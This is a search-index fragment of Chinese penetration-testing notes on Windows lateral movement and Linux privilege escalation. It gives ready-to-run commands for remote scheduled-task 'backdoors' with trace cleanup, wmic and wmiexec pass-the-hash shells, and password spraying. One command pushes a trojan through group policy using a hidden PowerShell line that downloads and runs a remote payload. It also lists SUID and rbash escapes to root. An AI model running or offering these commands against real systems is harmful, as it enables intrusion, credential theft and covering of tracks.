\u53e6\u5916\uff0c\u5728\u6211\u4eec\u521b\u5efa\u597d\u8ba1\u5212\u4efb\u52a1\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u5217\u6307\u4ee4\u7acb\u5373\u8ba9\u8ba1\u5212\u4efb\u52a1\u6267\u884c\uff08\u5982\u679c\u62d2\u7edd\u8bbf\u95ee\u7684\u8bdd\u5c31\u52a0\u4e0a/u /p\u53c2\u6570\uff09 schtasks /run /s 192.168.183.130 /i /tn backdoor // i\uff1a\u5ffd\u7565\u4efb\u4f55\u9650\u5236\u7acb\u5373\u8fd0\u884c\u4efb\u52a1 \u8ba1\u5212\u4efb\u52a1\u6267\u884c\u540e\u9700\u8981\u6e05\u7406\u75d5\u8ff9 schtasks /delete /s 192.168.183.130 /tn \"backdoor\" /f","title":"schtasks"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#sc","text":"\u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u64cd\u63a7\u670d\u52a1\u3002 sc \\\\[\u4e3b\u673a\u540d/IP] create [servicename] binpath= \"[path]\" #\u521b\u5efa\u670d\u52a1\uff0c\u5176\u4e2dbinpath\u53ef\u4ee5\u662f\u67d0\u4e2aexe\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u6bb5\u6307\u4ee4\u3002\u5f53\u4e3a\u8def\u5f84\u65f6\uff0c\u670d\u52a1\u542f\u52a8\u65f6\u4f1a\u81ea\u52a8\u6267\u884c\u8be5exe\u6587\u4ef6\uff0c\u5f53\u4e3a\u6307\u4ee4\u65f6\uff0c\u670d\u52a1\u542f\u52a8\u65f6\u4f1a\u81ea\u52a8\u6267\u884c\u8be5\u6307\u4ee4 sc \\\\[host] start [servicename] \u542f\u52a8\u67d0\u4e2a\u670d\u52a1 sc \\\\[host] delete [servicename] #\u5220\u9664\u670d\u52a1","title":"sc"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#wmi","text":"\u4eceWindows 98\u5f00\u59cb\uff0cWindows\u64cd\u4f5c\u7cfb\u7edf\u90fd\u652f\u6301WMI\u3002WMI\u662f\u7531\u4e00\u7cfb\u5217\u5de5\u5177\u96c6\u7ec4\u6210\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7/node\u9009\u9879\u4f7f\u7528\u7aef\u53e3135\u4e0a\u7684\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528(RPC)\u8fdb\u884c\u901a\u4fe1\u4ee5\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\uff0c\u5b83\u5141\u8bb8\u7cfb\u7edf\u7ba1\u7406\u5458\u8fdc\u7a0b\u6267\u884c\u81ea\u52a8\u5316\u7ba1\u7406\u4efb\u52a1\uff0c\u4f8b\u5982\u8fdc\u7a0b\u542f\u52a8\u670d\u52a1\u6216\u6267\u884c\u547d\u4ee4\u3002\u5e76\u4e14wimc\u6267\u884c\u547d\u4ee4\u65f6\u4e0d\u4f1a\u7559\u4e0b\u65e5\u5fd7\u4fe1\u606f\u3002 \u901a\u8fc7wmic\u5728\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u5f00\u542f\u8fdb\u7a0b wmic /node:192.168.183.130 /user:administrator /password:Liu78963 process call create \"command\"","title":"wmi"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#wmiexec","text":"\u901a\u8fc7wmic\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b\u65f6\uff0c\u4e0d\u4f1a\u6709\u56de\u663e\uff0c\u9700\u8981\u901a\u8fc7ipc\\$\u94fe\u63a5type\uff0c\u91cd\u5b9a\u5411\u7b49\u624b\u6bb5\u624d\u80fd\u770b\u5230\u56de\u663e\u7ed3\u679c\uff0c\u5c31\u5f88\u4e0d\u65b9\u4fbf\uff0cwmicexec\u7684\u51fa\u73b0\u5c31\u5f88\u597d\u7684\u89e3\u51b3\u4e86\u8fd9\u4e00\u75db\u70b9\u3002\u5177\u4f53\u539f\u7406\u662f\u901a\u8fc7wmic\u5728135\u7aef\u53e3\u8fdb\u884c\u4ea4\u4e92\uff0c\u518d\u628a\u5185\u5bb9\u901a\u8fc7445\u7aef\u53e3\u4f20\u56de\u6765\u3002 wmiexec\u666e\u904d\u6765\u8bf4\u6709\u4e09\u79cd\u7248\u672c.py\uff0cexe\uff0c.vbs\u3002\u53ef\u4ee5\u8d70socks5\u534f\u8bae\u4ee3\u5165\u5185\u7f51\uff0c\u675c\u7edd\u4e86bypassav\u7684\u9ebb\u70e6\u3002 (exe\u7248\u672c\u7f51\u4e0a\u4f3c\u4e4e\u5f88\u4e0d\u597d\u627e) \u8fd9\u91cc\u7528python\u7248\u672c\uff0c\u4e0b\u8f7d\u94fe\u63a5 https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22\uff0c impacket\u6309\u7167\u7f51\u4e0a\u5b89\u88c5\u6765\u5f04\u5c31\u884c\u4e86 1.\u73af\u5883linux\uff0c\u6211\u4eec\u914d\u7f6e\u597dproxychanis\u4ee3\u5165\u5185\u7f51\uff08\u7565 2.proxychains wmiexec.py \u57df\u540d/\u7528\u6237\u540d:\u5bc6\u7801@ip \u83b7\u5f97shell 3.\u4e5f\u53ef\u4ee5\u8fdb\u884chash\u4f20\u9012 python wmiexec.py -hashes LM Hash:NT Hash \u57df\u540d/\u7528\u6237\u540d@\u76ee\u6807IP \u6548\u679c\u56fe","title":"wmiexec"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#winrm","text":"\u200b winRm\uff08\u5fae\u8f6f\u8fdc\u7a0b\u7ba1\u7406\uff09\u662fWS-Management\u534f\u8bae\u7684\u5b9e\u73b0\u7ec4\u4ef6\u3002WinRM\u662fwindows\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e00\u90e8\u5206\u3002\u662f\u4e00\u9879\u5141\u8bb8\u7ba1\u7406\u5458\u5728\u7cfb\u7edf\u4e0a\u8fdc\u7a0b\u6267\u884c\u7ba1\u7406\u4efb\u52a1\u7684\u670d\u52a1\u3002\u901a\u4fe1\u901a\u8fc7HTTP\uff085985\uff09\u6216HTTPS SOAP\uff085986\uff09\u6267\u884c\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u652f\u6301Kerberos\u548cNTLM\u8eab\u4efd\u9a8c\u8bc1\u4ee5\u53ca\u57fa\u672c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u4f60\u9700\u8981\u7ba1\u7406\u5458\u8eab\u4efd\u624d\u80fd\u4f7f\u7528\u5b83\u3002 \u200b \u9002\u7528\u7248\u672c:\u9002\u7528\u4e8e Win server 2008 / Win7 \u53ca\u4ee5\u540e\u7684\u7cfb\u7edf\uff0c\u4f46\u662f Win server 2008 / PC \u5168\u7248\u672c\u7cfb\u7edf\u9ed8\u8ba4\u5173\u95ed\u3002\u53ea\u6709\u5728Win server 2012 \u4e4b\u540e\u7684\u7248\u672c\u7684WinRM\u670d\u52a1\u624d\u9ed8\u8ba4\u542f\u52a8\u5e76\u76d1\u542c\u4e865985\u7aef\u53e3\uff0c\u5141\u8bb8\u8fdc\u7a0b\u4efb\u610f\u4e3b\u673a\u6765\u7ba1\u7406\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0bpowershell\u547d\u4ee4\u67e5\u770b\u673a\u5668\u4e0a\u7684winrm\u662f\u5426\u6b63\u5e38\u8fd0\u884c Get-WmiObject -Class win32_service | Where-Object {$_.name -like \"WinRM\"} \u82e5\u6ca1\u5f00\u542f\uff0c\u4f60\u53ef\u4ee5\u5728\u7ba1\u7406\u5458\u6743\u9650\u4e0b\u6267\u884c\u4ee5\u4e0b\u6307\u4ee4\u5f00\u542f winrm quickconfig -q or Enable-PSRemoting -Force \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c winrs -r:192.168.86.114 -u:192.168.86.114\\administrator -p:123456!@#$% whoami","title":"winrm"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_18","text":"","title":"\u5229\u7528\u7ec4\u7b56\u7565"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_19","text":"\u5047\u8bbe\u57df\u7ba1\u60f3\u901a\u8fc7\u7ec4\u7b56\u7565\u6765\u4fee\u6539\u7528\u6237\u5bc6\u7801\uff0c\u5982\u679c\u4ed6\u4e0d\u4f7f\u7528GPP\uff0c\u90a3\u4e48\u4ed6\u53ea\u6709\u901a\u8fc7GPO\u914d\u5408\u811a\u672c\u4e0b\u53d1\u7684\u65b9\u5f0f\u6765\u4fee\u6539\u7528\u6237\u5bc6\u7801\u3002 \u8fd9\u79cd\u811a\u672c\u53ef\u80fd\u4f1a\u957f\u5f97\u50cf\u8fd9\u6837 strComputer = \".\" Set objUser = GetObject(\"WinNT://\" & strComputer & \"/Administrator, user\") objUser.SetPassword \"123QWEQWE!@#\" objUser.SetInfo \u4fdd\u5b58\u8fd9\u4e2a\u811a\u672c\u4e3a cpass.vbs ,\u8fd9\u4e2a\u811a\u672c\u7684\u4f5c\u7528\u5c31\u662f\u4fee\u6539\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u7684\u5bc6\u7801\u4e3a 123QWEQWE!@# \u7136\u540e\u901a\u8fc7GPO\u4e0b\u53d1\u6b64\u811a\u672c\uff0c\u8be5\u811a\u672c\u5c31\u4f1a\u88ab\u4fdd\u5b58\u4e8eSYSVOL\u6587\u4ef6\u5939\u4e2d\u3002 \u53c8\u56e0\u4e3a\u57df\u4e2d\u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u8bfb\u53d6SYSVOL\u6587\u4ef6\u5939\u4e2d\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u6307\u4e0d\u5b9a\u5c31\u4f1a\u7ffb\u5230\u8fd9\u79cd\u66b4\u9732\u660e\u6587\u5bc6\u7801\u7684\u811a\u672c\u3002 for /r \\\\dc/sysvol %i in (*.vbs) do @echo %i for /r \\\\dc/sysvol %i in (*.bat) do @echo %i \u4f46\u662f\u6709\u4e9b\u65f6\u5019\u5bc6\u7801\u4f1a\u88ab\u52a0\u5bc6\uff0c\u53ef\u4ee5\u7528\u6b64\u5de5\u5177\u89e3\u51b3 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 \u4fee\u590d\uff1a\u6253\u4e86\u8865\u4e01KB2962486\u540e\uff0c\u65e0\u6cd5\u5728\u7ec4\u7b56\u7565\u4e2d\u8bbe\u7f6e\u7528\u6237\u540d\u5bc6\u7801\u3002","title":"\u8bfb\u53d6\u811a\u672c\u4e2d\u7684\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_20","text":"\u57df\u7ba1\u53ef\u80fd\u4f1a\u7528\u7ec4\u7b56\u7565\u6279\u91cf\u4fee\u6539\u57df\u4e2d\u7528\u6237\u5bc6\u7801\uff08\u7279\u522b\u662f\u672c\u5730\u7ba1\u7406\u5458\uff09\u3002\u6240\u4ee5\u62ff\u5230\u4e00\u4e2a\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801\u540e\u4e0d\u59a8\u8bd5\u8bd5\u5bc6\u7801\u590d\u7528\uff0c\u6307\u4e0d\u5b9a\u5c31\u6709\u60ca\u559c","title":"\u6279\u91cf\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_21","text":"\u6709\u65f6\u5019\u62ff\u4e0b\u57df\u7ba1\uff0c\u4f46\u662f\u76ee\u6807\u673a\u5668\u6709\u9632\u706b\u5899\u7b49\u539f\u56e0\u4e0d\u80fd\u76f4\u63a5smb\u6216\u8005wmi\u8bbf\u95ee\u3002\u6b64\u65f6\u53ef\u7528\u7ec4\u7b56\u7565\u4e0b\u53d1\u6728\u9a6c\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u3002 https://github.com/FSecureLABS/SharpGPOAbuse c#\u7a0b\u5e8f\uff0c\u5728cs\u4e0a\u53ef\u4ee5\u901a\u8fc7execute-assembly\u6765\u5185\u5b58\u6267\u884c\uff0c\u514d\u6740\u6027++\u3002 #\u52a0\u8f7dGroupPolicy\u6a21\u5757 \uff08win7\u6ca1\u6709\uff0cwin10\u6709\uff09 Import-Module GroupPolicy #\u521b\u5efa\u4e00\u4e2aGPO\u5e76\u5c06GPO\u94fe\u63a5\u5230\u57dftest.local\uff0c\u9700\u8981\u57df\u7ba1\u6743\u9650\u3002 new-gpo -name TestGPO | new-gplink -Target \"dc=test,dc=local\" #\u6dfb\u52a0\u5b9a\u65f6\u4efb\u52a1 --TargetDnsName\u6307\u5b9a\u8ba1\u7b97\u673a SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update2\" --Author DOMAIN\\Admin --Command \"cmd.exe\" --Arguments \"/c calc.exe\" --GPOName \"TestGPO2\" --FilterEnabled --TargetDnsName PC-jack-0day.0day.org # cs\u7248\u672c execute-assembly F:\\\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update2\" --Author demo\\\\administrator --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.1/payload.ps1'))\\\"\" --GPOName \"TestGP02\" --FilterEnabled --TargetDnsName 192.168.40.148 #\u5f3a\u5236\u66f4\u65b0\u7ec4\u7b56\u7565\u4f7f\u7ec4\u7b56\u7565\u7acb\u5373\u751f\u6548\uff0c\u6216\u8005\u9ed8\u8ba4\u7b49\u5f8590\u5206\u949f\u7b49\u5f85\u7ec4\u7b56\u7565\u81ea\u5df1\u66f4\u65b0 gpupdate /force #\u5220\u9664GPO Remove-GPO -Name TestGPO2","title":"\u7ec4\u7b56\u7565\u4e0b\u53d1\u8ba1\u5212\u4efb\u52a1\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_22","text":"https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1 powershell -exec bypass Import-Module .\\Invoke-DomainPasswordSprayOutsideTheDomain.ps1 \u4f7f\u2f64\u5355\u4e2a\u5bc6\u7801 Invoke-DomainPasswordSprayOutsideTheDomain -UserList users.txt -Domain \"10.10.10.10/DC=redteam,DC=com\" -Password admin!@#45 \u4f7f\u7528\u5bc6\u7801\u6587\u4ef6 Invoke-DomainPasswordSprayOutsideTheDomain -UserList users.txt -Domain \"192.168.1.1/DC=test,DC=com\" -PasswordList passlist.txt -OutFile sprayed-creds.txt \u5982\u679c\u4e0d\u52a0userlist\u53c2\u6570\uff0c\u5c31\u4f1a\u600e\u4e48\u83b7\u53d6\u57df\u5185\u7528\u6237\u540d\u8fdb\u884c\u55b7\u6d12 https://github.com/dafthack/DomainPasswordSpray \u81ea\u52a8\u6536\u96c6\u57df\u5185\u7528\u6237\u7136\u540e\u55b7\u6d12 Invoke-DomainPasswordSpray -Password Spring2017 \u7528\u8d26\u6237\u540d\u6587\u4ef6\u548c\u5bc6\u7801\u6587\u4ef6 Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt","title":"\u5bc6\u7801\u55b7\u6d12"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/%E6%8F%90%E6%9D%83/","text":"\u63d0\u6743 Windows\u63d0\u6743 Linux\u63d0\u6743","title":"\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/%E6%8F%90%E6%9D%83/#_1","text":"Windows\u63d0\u6743 Linux\u63d0\u6743","title":"\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/","text":"Linux\u63d0\u6743 Linux\u63d0\u6743\u603b\u7ed3","title":"Linux\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/#linux","text":"Linux\u63d0\u6743\u603b\u7ed3","title":"Linux\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/","text":"Linux\u63d0\u6743\u603b\u7ed3 \u76ee\u5f55 sudo \u548c suid \u63d0\u6743 \u53ef\u5229\u7528\u547d\u4ee4\u6e05\u5355 \u4f55\u4e3asuid \u4f55\u4e3asudo \u904d\u5386\u76ee\u5f55\u4e2d\u7684suid\u6587\u4ef6 \u7528sudo -l \u67e5\u770b\u54ea\u4e9b\u547d\u4ee4\u80fd\u88absudo \u53ef\u5229\u7528\u4e8e\u63d0\u6743\u7684\u547d\u4ee4 1.nmap 2.find 3.vim 4.bash 5.less\uff0cmore 6.exim rbash \u7ed5\u8fc7 \u4f55\u4e3arbash bypass scp bypass \u8fdb\u5165\u547d\u4ee4\u81ea\u5e26shell bypass find bypasss \u7f16\u7a0b\u8bed\u8a00 bypass cp bypass \u76f4\u63a5\u66f4\u6539PATH/SHELL\u53d8\u91cf ssh bypass \u5185\u6838\u63d0\u6743 \u810f\u725b cve-cve-2023-cve-2023-35001 passwd\u548cshadow \u660e\u6587\u5bc6\u7801 passwd \u53ef\u5199 \u7206\u7834shadow \u8ba1\u5212\u4efb\u52a1 \u6587\u4ef6\u91cd\u5199 \u73af\u5883\u53d8\u91cf\u52ab\u6301 \u901a\u914d\u7b26\u63d0\u6743 \u73af\u5883\u53d8\u91cf \u5bc6\u7801\u67e5\u627e \u6587\u4ef6\u5185\u67e5\u627e \u67e5\u627e\u5341\u5206\u949f\u5185\u66f4\u6539\u8fc7\u7684\u6587\u4ef6 capabilities \u7b80\u4ecb \u5b9e\u64cd \u901a\u8fc7cap_setuid \u901a\u8fc7CAP_DAC_READ_SEARCH Docker Docker\u7528\u6237\u7ec4\u63d0\u6743 NFS no_root_squash pkexec \u63d0\u6743CVE-2021-4034 sudo \u548c suid \u63d0\u6743 \u53ef\u5229\u7528\u547d\u4ee4\u6e05\u5355 https://gtfobins.github.io// \u4f55\u4e3asuid \u53ef\u89c1\u5728\u6743\u9650\u4f4d\u7f6e\u6709\u4e00\u4e2as\u6743\u9650\u3002\u90a3\u4e48\u8fd9\u4e2as\u7684\u4f5c\u7528\u662f\u4ec0\u4e48\u5462\uff1f \u7b54\u6848\u662f\u5f53\u5176\u4ed6\u7528\u6237\u6267\u884c\u8be5\u6587\u4ef6\u65f6\uff0c\u8be5\u6587\u4ef6\u4f1a\u4ee5root\u7684\u8eab\u4efd\u6267\u884c\u3002 \u8fd9\u91cc\u5c31\u6d89\u53ca\u5230\u4e86Effective UID\u548cReal UID\u4ee5\u53caSaved UID Effective UID: \u7a0b\u5e8f\u5b9e\u9645\u64cd\u4f5c\u65f6\u751f\u6548\u7684UID Real UID: \u6267\u884c\u8be5\u7a0b\u5e8f\u7684\u7528\u6237\u7684\u5b9e\u9645UID Saved UID: \u5728\u9ad8\u6743\u9650\u7528\u6237\u964d\u6743\u540e\uff0c\u4fdd\u7559\u7684\u5176\u539f\u672cUID (\u4e0d\u5c55\u5f00\u8bf4) \u6240\u4ee5\u589e\u52a0\u4e86\u4e00\u4e2as\u6743\u9650\uff0c\u8be5\u7a0b\u5e8f\u5728\u5b9e\u9645\u8fd0\u884c\u65f6Effective UID\u5c31\u4f1a\u53d8\u4e3a0\uff0c\u5373root\u7684UID \u4f55\u4e3asudo \u5c31\u662f\u80fd\u628a\u4e00\u4e2a\u547d\u4ee4\u89c6\u4f5croot\u6765\u6267\u884c,\u7528sudo-l\u67e5\u770b\u53ef\u4ee5\u88absudo\u7684\u547d\u4ee4 \u904d\u5386\u76ee\u5f55\u4e2d\u7684suid\u6587\u4ef6 find / -perm -u=s 2>/dev/null \u6267\u884c\u8be5\u547d\u4ee4\uff0c\u4f1a\u5f97\u5230\u6240\u6709suid\u6587\u4ef6 \u7528sudo -l \u67e5\u770b\u54ea\u4e9b\u547d\u4ee4\u80fd\u88absudo \u53ef\u5229\u7528\u4e8e\u63d0\u6743\u7684\u547d\u4ee4 1.nmap nmap --interactive \u4f7f\u7528nmap\u7684udp\u6216tcp syn\u626b\u63cf\u65f6\uff0c\u9700\u8981\u7528\u5230root\u6743\u9650\uff0c\u6240\u4ee5\u6709\u4e9b\u7ba1\u7406\u5458\u56fe\u65b9\u4fbf\u4f1a\u76f4\u63a5\u7ed9namp\u4e0as\u6743\u9650\uff0c\u800cnmap 5.20(\u4f7f\u7528nmap -v\u67e5\u770bnmap\u7248\u672c)\u4e4b\u524d\u6709\u4e00\u4e2ainteractive\u4ea4\u4e92\u6a21\u5f0f(nmap \u2013interactive)\uff0c\u5728nmap effective uid\u4e3a0\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u6a21\u5f0f\u83b7\u5f97root\u6743\u9650\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\uff0c\u6210\u529f\u63d0\u6743 echo \"os.execute('/bin/bash')\" > ./shell nmap --script=shell \u5168\u7248\u672c\u901a\u6740\u63d0\u6743\uff0c\u5229\u7528nmap\u53ef\u4ee5\u6267\u884c\u6307\u5b9a\u6587\u4ef6\u7684\u7279\u70b9\u63d0\u6743 2.find find / -exec command find\u547d\u4ee4\u81ea\u5e26-exec\u53c2\u6570\uff0c\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\uff0c\u82e5find\u6709suid\u6743\u9650\uff0c\u90a3\u4e48\u4f7f\u7528exec\u76f8\u5f53\u4e8e\u76f4\u63a5\u63d0\u6743\u5230root. \u8bfb\u6587\u4ef6 find /path -exec {} \\; 3.vim vim\u6709\u4e86suid\u5c31\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u4e86 \u540c\u65f6\u4e5f\u53ef\u4ee5\u8f93\u5165 :shell \u6765\u83b7\u53d6root shell 4.bash bash -p \u5f00\u542f\u4e00\u4e2a\u65b0shell\uff0csuid\u7684\u8bdd\u81ea\u7136\u662f\u5f00\u542froot shell 5.less\uff0cmore \u548cvim\u5dee\u4e0d\u591a\uff0c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u8f93\u5165 !command \u8fdb\u884c\u63d0\u6743\u5230root 6.exim exim\u5728\u7279\u5b9a\u7248\u672c\u4e0b\u4f1a\u6709suid\u63d0\u6743 \u4e0b\u8f7dexp\u6253\u5c31\u5b8c\u4e8b\u4e86 rbash \u7ed5\u8fc7 \u4f55\u4e3arbash rbash\uff0c\u662f\u51fa\u4e8e\u5b89\u5168\u6027\u8003\u8651\u7684\u4e00\u4e2a\u529f\u80fd\u53d7\u9650\u7684bash\uff0c\u6211\u5728vulnhub dc-2\u9996\u6b21\u63a5\u89e6,\u4ed6\u7684\u9650\u5236\u6027\u53ef\u80fd\u4f1a\u6709\u5982\u4e0b. cd \u5207\u6362\u76ee\u5f55 \u542b\u6709\u659c\u6760 / \u7684\u547d\u4ee4, \u8b6c\u5982 /bin/sh \u8bbe\u7f6e PATH ENV \u7b49\u73af\u5883\u53d8\u91cf \u4f7f\u7528 > < \u8fdb\u884c\u91cd\u5b9a\u5411 binary \u7684\u8fd0\u884c. \u901a\u5e38 root \u7528\u6237\u4f1a\u624b\u52a8\u521b\u5efa /bin/binary_file -> /home/rbash_user/bin/binary_file \u7684\u8f6f\u94fe\u63a5, \u9650\u5236\u6027\u5730\u63d0\u4f9b\u90e8\u5206 binary_file \u7ed9 rbash_user \u4f7f\u7528 \u5728 bash \u4e0b echo $SHELL , \u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u73af\u5883\u662f\u5426\u662f rbash. bypass scp bypass \u6211\u5728 http://www.const27.com/2020/07/02/vulnhub-dc-2/\u5c31\u662f\u7528scp\u7ed5\u7684 \u8fdb\u5165\u547d\u4ee4\u81ea\u5e26shell bypass man,git config help,more,less,vim,vi,ftp,gdb\u7b49\u547d\u4ee4\u90fd\u6709\u81ea\u5df1\u7684shell\uff0c\u6211\u4eec\u53ea\u9700\u5728\u4ed6\u4eec\u5404\u81ea\u7684shell\u4e2d\u6267\u884c/bin/sh\u5373\u53ef \u4e00\u822c\u90fd\u662f\u5728shell\u952e\u5165!/bin/sh\u6765bypass rbash \u4e0b\u9762\u8fd9\u79cd\u65b9\u6cd5\u4e5f\u662f\u53ef\u884c\u7684\uff08\u4f3c\u4e4e\u4ec5vim) :set shell=/bin/bash :shell 